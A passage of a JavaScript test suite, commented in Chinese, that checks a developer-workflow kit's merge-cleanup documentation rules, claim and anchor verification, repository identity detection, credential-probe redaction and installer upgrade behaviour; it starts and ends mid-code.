    '  5. `git worktree remove <路径>`；',
    '  6. `git branch -d <分支>`；',
    '  7. 先查（`git ls-remote --heads origin <分支>`）再 `git push origin --delete <分支>`。',
    '',
  ].join('\n')

  const want = finishCommandsOf(base)
  // 粒度是**子命令**（`git branch`、`git worktree`），不带后面的参数：
  // 参数在一处写成 `<路径>`、另一处写成 `<worktree 路径>`，那是措辞差异，不该报。
  // 带不带 `-d` 这类真正的参数差异，由七步的存在性判据（`FINISH_STEPS` 里的 `/git branch -d/`）管。
  if (!want || want.length !== 6) {
    return `七步里应读出 6 条 git 子命令，实际：${want ? want.join('、') : 'undefined'}`
  }
  for (const cmd of ['git switch', 'git pull', 'git worktree', 'git branch', 'git ls-remote', 'git push']) {
    if (!want.includes(cmd)) return `漏了 ${cmd}，实际：${want.join('、')}`
  }

  // **正面：只改白话，六条命令一字不动**——必须判成一致。
  //
  // 这一面是判据的全部价值所在：如果「说法不同」也报，两份文档就被焊死了，以后想给不同
  // 读者写不同的话都不行。所以样本得**保留每一条行内代码**，只换外面的字。
  const reworded = base
    .replace('1. 把要写的东西写完；', '1. 该写的先写完，跟着这次改动一起提交；')
    .replace('2. 合并 PR；', '2. 把 PR 合掉；')
    .replace('3. 回读确认 `state=MERGED`；', '3. 回去看一眼，状态得是 `state=MERGED`；')
    .replace('先查（`git ls-remote --heads origin <分支>`）再', '先看远端还在不在（`git ls-remote --heads origin <分支>`），确认了再')
  const rew = finishCommandsOf(reworded)
  if (!rew || rew.length !== 6) {
    return `只改白话时命令数应保持 6 条，实际：${rew ? rew.join('、') : 'undefined'}`
  }
  if (rew.join('|') !== want.join('|')) {
    return `只改白话却读出了不同的命令集：${want.join('、')} → ${rew.join('、')}`
  }

  // **反面一：连命令一起删**——这才是不一致。
  const dropOne = base.replace('先查（`git ls-remote --heads origin <分支>`）再', '先看远端还在不在，确认之后再')
  const dropped = finishCommandsOf(dropOne)
  if (!dropped) return '删掉 ls-remote 那条命令后读不出命令集'
  if (dropped.includes('git ls-remote')) return '删掉 ls-remote 之后仍然读得到它'
  if (dropped.length !== 5) return `删掉一条命令后应剩 5 条，实际 ${dropped.length}`

  // **反面二：没有七步锚点时返回 undefined，不是空数组**——
  // 空数组会被上层当成「没有命令」，于是「找不到」和「一个都没写」长得一样。
  if (finishCommandsOf('## 别的节\n\n什么也没有\n') !== undefined) {
    return '没有锚点时应返回 undefined，不能返回空数组'
  }
  return true
}])

cases.push(['收尾章：内容下限抓得住「三处一起漏」', async () => {
  // 三处互相比对只有**相对下限**：三处一起删掉一条命令，对拍永远说「一致」。
  // 而改规则的人恰恰会同时改三处——集体遗忘比单点漂移更常见。这条断言盯的是绝对下限。
  const { finishRequiredMissing } = await loadPreflight()

  const full = [
    '## 日常协作', '',
    '- **第四步：合并收尾**——固定 7 步：',
    '  1. 把要写的东西写完；',
    '  2. 合并 PR；',
    '  3. 回读确认 `state=MERGED`；',
    '  4. `git switch main && git pull`；',
    '  5. `git worktree remove <路径>`；',
    '  6. `git branch -d <分支>`；',
    '  7. 删远端分支之前查两件事：远端还在不在（`git ls-remote --heads origin <分支>`）、'
      + '有没有下游堆叠 PR 以该分支为 base；两件都清了才 `git push origin --delete <分支>`。',
    '',
    '  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。',
    '',
  ].join('\n')

  if (finishRequiredMissing(full).length !== 0) {
    return `要素齐全却报缺：${finishRequiredMissing(full).join('、')}`
  }

  // 反面一：删掉「下游堆叠 PR」那半句。
  const noDownstream = full.replace('、有没有下游堆叠 PR 以该分支为 base', '')
  if (!finishRequiredMissing(noDownstream).some((l) => l.includes('下游堆叠'))) {
    return '删掉「下游堆叠 PR」之后没有报缺——这一半又没有守卫了'
  }

  // 反面二：把「查远端」这一整半删掉（命令和白话一起删）。
  const noProbe = full
    .replace('远端还在不在（`git ls-remote --heads origin <分支>`）、', '')
  if (!finishRequiredMissing(noProbe).some((l) => l.includes('远端还在不在'))) {
    return '删掉「查远端」这一整半之后没有报缺'
  }

  // 反面二之二：**只删命令、留着那句白话，也必须报。**
  // 这一面治的是「把断言放宽成认白话」——那样一来「三处一起删掉命令」就静默通过了。
  const cmdGone = full.replace('`git ls-remote --heads origin <分支>`', '')
  if (!finishRequiredMissing(cmdGone).some((l) => l.includes('远端还在不在'))) {
    return '只删 ls-remote 命令、留白话，仍然算交代——断言被放宽了'
  }

  // 反面三：删掉「删之前先问」那一整段。
  const noAsk = full.replace('  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。\n', '')
  if (!finishRequiredMissing(noAsk).some((l) => l.includes('问一次'))) {
    return '删掉「删之前先问」之后没有报缺'
  }

  // 反面三之二（回归防线）：即使七步正文里出现了 worktree、本地分支、远端分支、回读确认，
  // 删掉独立散文段仍必须报缺——七步本身不能自凑齐 ask-before-delete。
  const stepsHaveKeywords = full
    .replace('`git branch -d <分支>`；', '再删本地分支 `git branch -d <分支>`；')
    .replace('  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。\n', '')
  if (!finishRequiredMissing(stepsHaveKeywords).some((l) => l.includes('问一次'))) {
    return '七步里凑齐了四个词但独立问询段被删，ask-before-delete 却放行了（假阴性漏检复发）'
  }

  // 反面四：**同一章里别处的正常用法不能算交代**——
  // 「产物清单」「卸之前先问人」「弱化门禁要人点头」都在这一章里，但都不是这条要求。
  const decoys = full.replace(
    '  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。\n',
    '  这一章别处还会说「产物清单」「卸之前先问人」「弱化门禁必须人点头」。\n',
  )
  if (!finishRequiredMissing(decoys).some((l) => l.includes('问一次'))) {
    return '别处的「产物清单 / 卸之前先问人 / 要人点头」被当成了交代——这一条又被蒙混了'
  }

  // 反面四：**同一个词出现在章外的别处，不算交代**——
  // 这正是先前那类「话说得比扫过的范围大」的毛病。范围是本章，不是全文。
  const outside = [
    '## 别的节', '',
    '这里顺嘴提到 git ls-remote、下游堆叠 PR、问人点头。', '',
    '## 日常协作', '',
    '- **第四步：合并收尾**——固定 7 步：',
    '  1. 把要写的东西写完；',
    '  2. 合并 PR；',
    '',
    '## 下一节', '',
    '什么也没有。', '',
  ].join('\n')
  if (finishRequiredMissing(outside).length !== 3) {
    return `章外提到不算交代：应报缺 3 项，实际 ${finishRequiredMissing(outside).length} 项`
  }

  // 反面五：**要素挪到第 7 步之后的解释段，不算第 7 步交代过。**
  // 这一条治的是「步正文切片不收口」：早先最后一步会吞掉本章余下全部内容，
  // 于是要素挪到哪都算数，范围宣告与实现不符。
  const stepScoped = full.replace(
    '  7. 删远端分支之前查两件事：远端还在不在（`git ls-remote --heads origin <分支>`）、'
      + '有没有下游堆叠 PR 以该分支为 base；两件都清了才 `git push origin --delete <分支>`。',
    '  7. 删远端分支之前查有没有下游堆叠 PR；两件都清了才 `git push origin --delete <分支>`。',
  ).replace(
    '  **第 5 步之前先把要删的清单列出来问一次**',
    '  解释段：远端用 `git ls-remote --heads origin <分支>` 查一下。\n\n  **第 5 步之前先把要删的清单列出来问一次**',
  )
  if (!finishRequiredMissing(stepScoped).some((l) => l.includes('远端还在不在'))) {
    return '要素挪到第 7 步之后的解释段仍然算数——步正文没有收口'
  }

  // **正面：换序、改成分行，都不该报。**
  // 排版不是判据。早先的正则要求三项同行按固定顺序出现，而这份文档自己的「清单长这样」
  // 就是分行的——那会把正确写法判成错的。
  const reordered = full.replace(
    '  哪个 worktree、哪条本地分支、哪条远端分支。',
    '  哪条本地分支、哪个 worktree、哪条远端分支。',
  )
  if (finishRequiredMissing(reordered).length !== 0) {
    return `清单换序被误报：${finishRequiredMissing(reordered).join('、')}`
  }

  const multiline = full.replace(
    '  **第 5 步之前先把要删的清单列出来问一次**：哪个 worktree、哪条本地分支、哪条远端分支。',
    '  **第 5 步之前先把要删的清单列出来问一次**：\n\n```text\n- worktree\n- 本地分支\n- 远端分支\n```',
  )
  if (finishRequiredMissing(multiline).length !== 0) {
    return `清单改成分行被误报：${finishRequiredMissing(multiline).join('、')}`
  }

  return true
}])

cases.push(['判据指路：review.mjs 里每一个 references/ 小节名都真实存在', async () => {
  // 判据改了文档结构之后，`ref` 指路会变成死指针——而它不会报错，只会让人点进去找不到那一节。
  // 这条断言读的是**真实文件**，不是夹具：指路的目标本来就在这个仓库里。
  const text = readFileSync(join(SKILL_ROOT, 'scripts', 'review.mjs'), 'utf8')
  const pairs = [...text.matchAll(/ref:\s*\{\s*file:\s*'(references\/[^']+)',\s*section:\s*'([^']+)'/g)]
  if (pairs.length === 0) return '没有从 review.mjs 里读出任何 ref 指路'
  for (const [, file, section] of pairs) {
    const target = join(SKILL_ROOT, file)
    if (!existsSync(target)) return `指路指向不存在的文件：${file}`
    // 小节名里的反引号与全角标点在标题里是原样的，只去掉包裹用的反引号。
    const wanted = section.replace(/`/g, '')
    const have = readFileSync(target, 'utf8').replace(/`/g, '')
    if (!have.includes(wanted)) return `${file} 里找不到小节「${section}」——指路是死的，点进去什么也没有`
  }
  return true
}])

// ── 契约回查与锚点：两条新判据各自的正面与反面 ──────────────────────────

cases.push(['契约回查：分支名变了要报，路径没了要报', async () => {
  const { verifyClaims, claimsOf } = await import('../lib/claims.mjs')
  const text = [
    '从 `main` 拉分支。',
    '',
    '```sh',
    'git switch main',
    'node scripts/example.mjs',
    '```',
  ].join('\n')

  const claims = claimsOf(text)
  if (!claims.branches.includes('main')) return `没抽出分支名：${JSON.stringify(claims.branches)}`
  if (!claims.paths.includes('scripts/example.mjs')) return `没抽出路径：${JSON.stringify(claims.paths)}`

  // 正面：分支名对得上、路径都在 → 全绿
  const ok = verifyClaims(text, { conventions: { defaultBranch: 'main' } }, () => true)
  if (ok.some((r) => !r.ok)) return `正面用例被误报：${JSON.stringify(ok)}`

  // 反面一：默认分支改名了 → 必须报，而且要说清是哪一条
  const stale = verifyClaims(text, { conventions: { defaultBranch: 'trunk' } }, () => true)
  const branchHit = stale.find((r) => r.id === 'claim.branch')
  if (!branchHit || branchHit.ok) return '分支改名了却没报——契约里的分支名会指到不存在的地方'

  // 反面二：点名的路径被删了 → 必须报
  const gone = verifyClaims(text, { conventions: { defaultBranch: 'main' } }, () => false)
  const pathHit = gone.find((r) => r.id === 'claim.path')
  if (!pathHit || pathHit.ok) return '路径没了却没报——照着契约做的人会找不到文件'
  return true
}])

cases.push(['契约回查：没有承诺可查时不出结论，不伪造一条「通过」', async () => {
  const { verifyClaims } = await import('../lib/claims.mjs')
  // 一条恒真的判据看起来在工作，实际什么都没验——这类检查最容易这样退化。
  const empty = verifyClaims('没有任何路径与分支名的纯文字。', { conventions: { defaultBranch: 'main' } }, () => true)
  if (empty.length !== 0) return `没有承诺时不该出结论，实际出了 ${empty.length} 条`
  return true
}])

cases.push(['契约回查：正文里的「像路径的词」不算承诺，只有反引号与代码块里的才算', async () => {
  const { claimsOf } = await import('../lib/claims.mjs')
  // 假阳性一多，这条判据就会被关掉——而它一关，真正该报的那些也跟着没了。
  const prose = '文档里常常随口提到 scripts/whatever.mjs 这样的例子，那是叙述，不是承诺。'
  const claims = claimsOf(prose)
  if (claims.paths.length !== 0) return `散文里的词被当成了承诺：${JSON.stringify(claims.paths)}`
  return true
}])

cases.push(['锚点：前缀能命中，重名要报，落空要报', async () => {
  const { matchHeadings } = await loadPreflight()
  const headings = new Set(['七、审查循环：怎么才会停', '七、审查循环的补充', '八、谁能合：按「收不收得回来」分档'])

  // 正面：只写「七、审查循环」能同时命中两个 → 报重名（这正是要的：逼指路写得更具体）
  const ambiguous = matchHeadings(headings, '七、审查循环')
  if (ambiguous.length !== 2) return `同前缀两节应报 2 个命中，实际 ${ambiguous.length}`

  // 正面：写全了一个 → 唯一命中
  const exact = matchHeadings(headings, '七、审查循环：怎么才会停')
  if (exact.length !== 1) return `写全了应唯一命中，实际 ${exact.length}`

  // 正面：标题里带反引号也能比
  if (matchHeadings(new Set(['三、`AGENTS.md`']), '三、AGENTS.md').length !== 1) return '反引号差异没被抹平'

  // 反面：完全不存在的节 → 0 个命中
  if (matchHeadings(headings, '九、根本没有这一节').length !== 0) return '不存在的节被命中了'
  return true
}])

cases.push(['缺口覆盖：没登记处置的缺口要报，悬空映射要报', async () => {
  const { coverageOf } = await import('./gap-coverage.mjs')
  const known = new Set(['git.absent'])

  // 正面：每一条都选了一档且映射真实存在
  const good = coverageOf([
    { id: 'a', review: 'git.absent' },
    { id: 'b', decision: 'some-key' },
    { id: 'c', surveyOnly: '只有勘察能判' },
  ], known, ['a', 'b', 'c'])
  if (good.ok.length !== 3 || good.unclaimed.length !== 0 || good.dangling.length !== 0) {
    return `正面用例被误报：${JSON.stringify(good)}`
  }

  // 反面一：三档都没选 → 必须报「没人接」
  const unclaimed = coverageOf([{ id: 'x' }], known, ['x'])
  if (unclaimed.unclaimed.length !== 1) return '没登记处置的缺口没有被报出来'

  // 反面二：映射写了个不存在的 id → 必须报悬空
  const dangling = coverageOf([{ id: 'y', review: 'git.typo' }], known, ['y'])
  if (dangling.dangling.length !== 1) return '映射指向不存在的结论时没有报出来——它看起来配好了，实际永远不触发'

  // 反面三：同时写两档 → 必须报重复
  const dup = coverageOf([{ id: 'z', review: 'git.absent', decision: 'k' }], known, ['z'])
  if (dup.duplicated.length !== 1) return '一条缺口写了两档时没有报出来——同一件事会有两个结论'

  // 反面四：**一条都没读出来** → 必须报「读不出来」，不能静默通过。
  // 这是这套检查最容易退化的形状：词法切块一失灵，读出来就是空数组，
  // 而空数组让前面三条全过——「0 条各有处置，退出码 0」，看起来比 17 条还干净。
  const empty = coverageOf([], known, ['git.absent'])
  if (empty.missing.length !== 1) return '一条都没读出来时没有报「读不出来」——判据被削成恒真了'
  if (empty.ok.length !== 0) return `空输入不该产出「通过」条目，实际 ${empty.ok.length} 条`

  // 反面五：源码里有、登记名单里没有 → 必须报
  const unknown = coverageOf([{ id: 'w', review: 'git.absent' }], known, ['git.absent'])
  if (unknown.unknown.length !== 1) return '源码里有却没登记的缺口没有被报出来'
  return true
}])

cases.push(['本仓库：勘察的每条缺口在体检里都有人接，且映射不悬空', async () => {
  const { checkGapCoverage } = await import('./gap-coverage.mjs')
  // 读真实源码，不是夹具：这条判据防的正是「这个仓库自己漏了一条」。
  const state = await checkGapCoverage(SKILL_ROOT)
  if (state.unclaimed.length > 0) return `没人接的缺口：${state.unclaimed.join('、')}`
  if (state.dangling.length > 0) return `悬空映射：${state.dangling.join('、')}`
  if (state.duplicated.length > 0) return `重复处置：${state.duplicated.join('、')}`
  // 读出来 0 条时，前三条全是空数组——这个检查会静默通过。这正是「恒真」的形状。
  if (state.missing.length > 0) return `读不出来的缺口：${state.missing.join('、')}`
  if (state.unknown.length > 0) return `源码里有却没登记的缺口：${state.unknown.join('、')}`
  return true
}])

cases.push(['本仓库：正文里没有节号指针', async () => {
  // 节号会随重排失效——一次插入就让十几处指路同时指错，而它们不会报错。
  const files = ['SKILL.md', 'AGENTS.md', 'README.md', 'README.en.md', 'CONTRIBUTING.md', 'RELEASING.md',
    ...readDirRefs(join(SKILL_ROOT, 'references')), ...readDirRefs(join(SKILL_ROOT, 'templates'))]
  const hit = []
  for (const name of files) {
    const full = join(SKILL_ROOT, name)
    if (!existsSync(full)) continue
    const lines = readFileSync(full, 'utf8').replace(/\r\n/g, '\n').split('\n')
    for (const [i, line] of lines.entries()) {
      if (/第[一二三四五六七八九十]+节/.test(line)) hit.push(`${name}:${i + 1}`)
    }
  }
  if (hit.length > 0) return `这些地方还在用节号指针：${hit.slice(0, 5).join('、')}`
  return true
}])

// ── v5 升级行为断言（C1..C11 正反双向） ───────────────────────────────

function runAbs(scriptRel, args, opts = {}) {
  return spawnSync(process.execPath, [join(SKILL_ROOT, scriptRel), ...args], {
    encoding: 'utf8',
    timeout: 60000,
    ...opts,
  })
}

cases.push(['五态身份：clone-readonly 防误判、自有缺 repository 判 maintainer、fork 与 undetermined 正反双向', async () => {
  const { classifyWorkspaceIdentity } = await import('../lib/platform/github.mjs')

  // 1. local-only：.git/pf-local-mode 强制本地模式（哪怕有远端）
  const localMode = classifyWorkspaceIdentity({
    gitFacts: { present: true, remote: 'https://github.com/other/repo.git', remoteUrls: { origin: 'https://github.com/other/repo.git' } },
    localMode: true,
  })
  if (localMode.role !== 'local-only') return `pf-local-mode 未判成 local-only：${localMode.role}`

  // 2. 反误判（核心）：clone 他人公开仓（即使 repository === origin），无写权限且历史作者非本机 -> clone-readonly，严禁判成 maintainer
  const clonedOther = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/other/demo.git',
      remoteUrls: { origin: 'https://github.com/other/demo.git' },
      commitCount: 5,
      historyAuthors: ['Origin Author <author@other.example>'],
      userName: 'Local User',
      userEmail: 'local@example.com',
    },
    declaredRepo: 'other/demo',
  })
  if (clonedOther.role !== 'clone-readonly') return `他人公开仓被误判成 ${clonedOther.role}`

  // 3. API 明确只读权限（即使历史或声明有误导）-> clone-readonly
  const apiReadOnly = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/org/lib.git',
      remoteUrls: { origin: 'https://github.com/org/lib.git' },
      commitCount: 1,
      historyAuthors: ['Me <me@example.com>'],
      userName: 'Me',
      userEmail: 'me@example.com',
    },
    declaredRepo: 'org/lib',
    probeApi: { canPush: false, viewerPermission: 'READ', login: 'outsider' },
  })
  if (apiReadOnly.role !== 'clone-readonly') return `只读 API 权限被判成 ${apiReadOnly.role}`

  // 4. 自有缺 declaredRepo 项目（本机身份匹配 origin owner 或全部提交作者匹配）-> maintainer
  const ownNoDecl = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/myuser/my-app.git',
      remoteUrls: { origin: 'https://github.com/myuser/my-app.git' },
      commitCount: 2,
      historyAuthors: ['myuser <myuser@users.noreply.github.com>'],
      userName: 'myuser',
      userEmail: 'myuser@users.noreply.github.com',
    },
  })
  if (ownNoDecl.role !== 'maintainer') return `自有缺 declaredRepo 仓未判成 maintainer：${ownNoDecl.role}`

  // 5. contributor-fork（有不同 upstream 且非只读）；反面：只读克隆他人 fork -> clone-readonly
  const forkOwn = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/me/app.git',
      remoteUrls: { origin: 'https://github.com/me/app.git', upstream: 'https://github.com/upstream/app.git' },
    },
    probeApi: { canPush: true, viewerPermission: 'WRITE', login: 'me' },
  })
  if (forkOwn.role !== 'contributor-fork') return `upstream 不同未判成 contributor-fork：${forkOwn.role}`

  const forkReadOnly = classifyWorkspaceIdentity({
    gitFacts: {
      present: true,
      remote: 'https://github.com/someone/app.git',
      remoteUrls: { origin: 'https://github.com/someone/app.git', upstream: 'https://github.com/upstream/app.git' },
    },
    probeApi: { canPush: false, viewerPermission: 'READ', login: 'me' },
  })
  if (forkReadOnly.role !== 'clone-readonly') return `只读他人 fork 被判成 ${forkReadOnly.role}`

  return true
}])

cases.push(['双轨凭据：SSH 可用不误报缺凭据、protocolMismatch 给出切换命令、Token 绝不泄露到序列化输出', async () => {
  const { probeGitHubEnv } = await import('../lib/platform/github.mjs')

  // 正面：SSH remote + ssh -T 成功 + HTTPS credential fill 返回空 -> ssh available，protocolMismatch=false，不误报
  const sshRunner = async (cmd, args) => {
    if (cmd === 'ssh') return { ok: true, code: 1, stdout: '', stderr: 'Hi octocat! You\'ve successfully authenticated, but GitHub does not provide shell access.' }
    if (cmd === 'git' && args[0] === 'credential') return { ok: false, code: 1, stdout: '', stderr: '' }
    if (cmd === 'git') return { ok: false, code: 1, stdout: '', stderr: '' }
    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
  }
  const sshRes = await probeGitHubEnv({
    remoteUrls: { origin: 'git@github.com:octocat/demo.git' },
    runner: sshRunner,
    env: {},
  })
  if (sshRes.ssh.state !== 'available' || sshRes.ssh.login !== 'octocat') {
    return `SSH 探测失败：${JSON.stringify(sshRes.ssh)}`
  }
  if (sshRes.protocolMismatch !== false) return `SSH 正常却报 protocolMismatch：${JSON.stringify(sshRes)}`
  if (sshRes.https.state === 'available') return '空 credential fill 不应判 HTTPS available'

  // 正面：HTTPS remote 无凭据但 SSH 可用 -> protocolMismatch=true 且给出 set-url 切换到 git@github.com 命令
  const mismatchRes = await probeGitHubEnv({
    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
    runner: sshRunner,
    env: {},
  })
  if (mismatchRes.protocolMismatch !== true || !String(mismatchRes.remediationCmd).includes('git@github.com:octocat/demo.git')) {
    return `protocolMismatch 提示不对：${JSON.stringify(mismatchRes)}`
  }

  // 安全脱敏：环境变量 GH_TOKEN 与 credential fill 返回的密码绝不出现在 JSON 序列化结果中
  const secretA = 'ghp_TestSecretTokenAlpha987654'
  const secretB = 'gho_CredentialHelperBeta123456'
  const tokenRunner = async (cmd, args) => {
    if (cmd === 'git' && args[0] === 'credential') {
      return { ok: true, code: 0, stdout: `protocol=https\nhost=github.com\nusername=octocat\npassword=${secretB}\n`, stderr: '' }
    }
    return { ok: false, code: 1, stdout: '', stderr: '', missing: true }
  }
  const tokRes = await probeGitHubEnv({
    remoteUrls: { origin: 'https://github.com/octocat/demo.git' },
    runner: tokenRunner,
    env: { GH_TOKEN: secretA },
  })
  const dumped = JSON.stringify(tokRes)
  if (dumped.includes(secretA) || dumped.includes(secretB)) return 'probeGitHubEnv 返回结果泄露了明文 token'
  if (tokRes.https.hasToken !== true || tokRes.https.username !== 'octocat') return `脱敏字段异常：${dumped}`

  // 真实子进程探测 survey --probe-auth --json 不得泄露 GH_TOKEN
  const dir = tmpProject({ 'README.md': '# demo\n' })
  try {
    gitInit(dir)
    const sub = await runNode('survey.mjs', [dir, '--probe-auth'])
    const subEnvRun = spawnSync(process.execPath, [join(SCRIPTS, 'survey.mjs'), dir, '--probe-auth'], {
      encoding: 'utf8',
      timeout: 30000,
      env: { ...process.env, GH_TOKEN: secretA, GITHUB_TOKEN: secretB },
    })
    if (subEnvRun.status !== 0) return `survey --probe-auth 退出异常：${subEnvRun.status}`
    if ((subEnvRun.stdout + subEnvRun.stderr).includes(secretA) || (subEnvRun.stdout + subEnvRun.stderr).includes(secretB)) {
      return 'survey --probe-auth 子进程输出泄露了环境变量 token'
    }
    if (sub.status !== 0) return `survey 退出 ${sub.status}`
  } finally { rmTree(dir) }

  return true
}])

cases.push(['equip.mjs：首次装备、幂等、三态升级与退役删除、用户魔改/自定义保留、--bootstrap-empty 正反双向', async () => {
  const target = tmpProject({ 'README.md': '# demo\n\n工程套件测试仓。\n' })
  const kitV1 = tmpProject({
    'lib/shared.mjs': 'export const VER = 1\n',
    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v1\n---\n# v1\n',
    'old-retired/legacy.md': '# obsolete\n',
  })
  const kitV2 = tmpProject({
    'lib/shared.mjs': 'export const VER = 2\n',
    'dev-flow/SKILL.md': '---\nname: dev-flow\ndescription: v2\n---\n# v2\n',
  })
  const emptyBoot = mkdtempSync(join(tmpdir(), 'pf-boot-'))

  try {
    // 1. 默认官方套件首次装备 + --check + 幂等
    const e1 = runAbs('scripts/equip.mjs', [target])
    if (e1.status !== 0) return `首次 equip 失败：${e1.stderr}`
    const chk0 = runAbs('scripts/equip.mjs', [target, '--check'])
    if (chk0.status !== 0) return `equip 后 --check 未通过：${chk0.stderr}`
    const e2 = runAbs('scripts/equip.mjs', [target])
    if (e2.status !== 0) return `第二次 equip 失败：${e2.stderr}`
    const p2 = JSON.parse(e2.stdout).equip
    if (p2.added.length !== 0 || p2.upgraded.length !== 0 || p2.conflicts.length !== 0 || p2.retired.length !== 0) {
      return `equip 不幂等：${JSON.stringify(p2)}`
    }

    // 2. 用户魔改 + 自定义 Skill -> --check 必须红，v1->v2 升级保留魔改与自定义，自动升级未改文件并物理删除退役文件
    const targetTri = tmpProject({ 'README.md': '# tri\n' })
    try {
      const i1 = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1])
      if (i1.status !== 0) return `v1 装备失败：${i1.stderr}`
      // 用户修改 dev-flow/SKILL.md 且保留 old-retired/legacy.md 未改；另建用户自定义 Skill
      const customSkill = join(targetTri, '.agents', 'skills', 'my-custom', 'SKILL.md')
      mkdirSync(dirname(customSkill), { recursive: true })
      writeFileSync(customSkill, '# user custom skill\n')
      const devFlowPath = join(targetTri, '.agents', 'skills', 'dev-flow', 'SKILL.md')
      writeFileSync(devFlowPath, '# user hacked dev-flow\n')

      const dirtyChk = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV1, '--check'])
      if (dirtyChk.status === 0) return '用户改动托管文件后 --check 却返回 0'

      const up = runAbs('scripts/equip.mjs', [targetTri, '--kit-dir', kitV2])
      if (up.status !== 0) return `v2 升级失败：${up.stderr}`
      const res = JSON.parse(up.stdout).equip
      if (!res.upgraded.includes('lib/shared.mjs')) return `未改旧文件没自动升级：${JSON.stringify(res)}`
      if (!res.conflicts.some((c) => c.path === 'dev-flow/SKILL.md')) return `用户魔改文件没进 conflicts 保护：${JSON.stringify(res)}`
      if (!res.retired.includes('old-retired/legacy.md')) return `未改退役文件没进 retired：${JSON.stringify(res)}`
      if (existsSync(join(targetTri, '.agents', 'skills', 'old-retired', 'legacy.md'))) return '退役文件未被物理删除'
      if (readFileSync(devFlowPath, 'utf8') !== '# user hacked dev-flow\n') return '用户魔改内容被覆盖'
      if (!existsSync(customSkill) || readFileSync(customSkill, 'utf8') !== '# user custom skill\n') {
        return '用户自定义 Skill 被误删或覆盖'
      }
    } finally { rmTree(targetTri) }

    // 3. --bootstrap-empty 正反双向
    const boot = runAbs('scripts/equip.mjs', [emptyBoot, '--bootstrap-empty', '--lang', 'node', '--name', 'demo-boot'])
    if (boot.status !== 0) return `空目录 --bootstrap-empty 失败：${boot.stderr}`
    for (const rel of ['package.json', 'src/index.mjs', 'test/smoke.test.mjs', 'docs/TDD.md', '.agents/skills/.pf-manifest.json']) {
      if (!existsSync(join(emptyBoot, rel))) return `bootstrap-empty 缺文件：${rel}`
    }
    const smokeRun = spawnSync(process.execPath, ['--test'], { cwd: emptyBoot, encoding: 'utf8', timeout: 30000 })
    if (smokeRun.status !== 0) return `bootstrap-empty 生成的测试没跑绿：${smokeRun.stderr || smokeRun.stdout}`

    // 反面：非空目录禁止 --bootstrap-empty
    const bootNonEmpty = runAbs('scripts/equip.mjs', [target, '--bootstrap-empty', '--lang', 'node'])
    if (bootNonEmpty.status === 0) return '非空目录却允许 --bootstrap-empty'

    return true
  } finally {
    rmTree(target)
    rmTree(kitV1)
    rmTree(kitV2)
    rmTree(emptyBoot)
  }
}])

cases.push(['compose-agents.mjs：超 30KB 硬阻断、未标 customized 但 SHA256 变化时保护不覆盖', async () => {
  const dir = tmpProject({
    'package.json': '{"name":"cap-demo","version":"1.0.0","scripts":{"test":"node -e \\"process.exit(0)\\""}}\n',
    'README.md': '# cap-demo\n\n体积限制与基线保护测试仓。\n',
  })
  gitInit(dir)
  try {
    const eq = runAbs('scripts/equip.mjs', [dir])
    if (eq.status !== 0) return `equip 失败：${eq.stderr}`
    const g1 = runAbs('scripts/compose-agents.mjs', [dir])
    if (g1.status !== 0) return `compose-agents 首次生成失败：${g1.stderr}`

    const agentsFile = join(dir, 'AGENTS.md')
    const original = readFileSync(agentsFile, 'utf8')

    // 1. 保护未标 customized 但已被手工改动且偏离模板的区间（修改「版本与发布」段落而不加 customized）
    const edited = original.replace('**提交纪律**：', '**提交纪律（手工微调）**：')
    if (edited === original) return '测试前置替换未命中 AGENTS.md 版本与发布段'
    writeFileSync(agentsFile, edited, 'utf8')

    // 当「版本与发布」与模板不一致且与 .pf-manifest.json 基线 SHA256 不同时，必须保护跳过并保留手工内容
    const g2 = runAbs('scripts/compose-agents.mjs', [dir])
    if (g2.status !== 0) return `保护场景刷新失败：${g2.stderr}`
    if (!/保护跳过/.test(g2.stderr || '') || !readFileSync(agentsFile, 'utf8').includes('手工微调')) {
      return `未标 customized 的手工改动没有被保护跳过：stderr=${g2.stderr}`
    }

    // 2. 反面：AGENTS.md 超 30KB 时刷新必须退出 1 阻断写入
    const oversized = `${original}\n\n## 补充说明\n\n${'x'.repeat(32000)}\n`
    writeFileSync(agentsFile, oversized, 'utf8')
    const g3 = runAbs('scripts/compose-agents.mjs', [dir])
    if (g3.status === 0) return 'AGENTS.md 超过 30720 字节时 compose-agents 没有报错阻断'
    if (!readFileSync(agentsFile, 'utf8').includes('## 补充说明')) return '超限阻断时改动了原文件'

    return true
  } finally { rmTree(dir) }
}])

cases.push(['worktree-deps.mjs：锁文件一致挂载共享依赖、安全解绑不删穿主仓、锁文件变化自动隔离', async () => {
  const dir = tmpProject({
    '.gitignore': 'node_modules/\n.worktrees/\n',
    'package.json': '{"name":"deps-demo","version":"1.0.0"}\n',
    'package-lock.json': '{"name":"deps-demo","lockfileVersion":3}\n',
    'README.md': '# deps\n',
  })
  gitInit(dir)
  spawnSync('git', ['branch', '-M', 'main'], { cwd: dir, stdio: 'ignore' })
  const mainPkgFile = join(dir, 'node_modules', 'fake-pkg', 'index.js')
  mkdirSync(dirname(mainPkgFile), { recursive: true })
  writeFileSync(mainPkgFile, 'module.exports = { ok: true }\n')

  const wt = join(dir, '.worktrees', 'impl-deps')
  try {
    const addWt = spawnSync('git', ['worktree', 'add', wt, '-b', 'feat/deps-test'], { cwd: dir, encoding: 'utf8' })
    if (addWt.status !== 0) return `创建 worktree 失败：${addWt.stderr}`

    // 正面：锁文件一致 -> mount 挂载并可读
    const m1 = runAbs('kit/skills/dev-flow/scripts/worktree-deps.mjs', ['mount', '--main', dir, '--worktree', wt, '--json'])
    if (m1.status !== 0) return `mount 失败：${m1.stderr}`
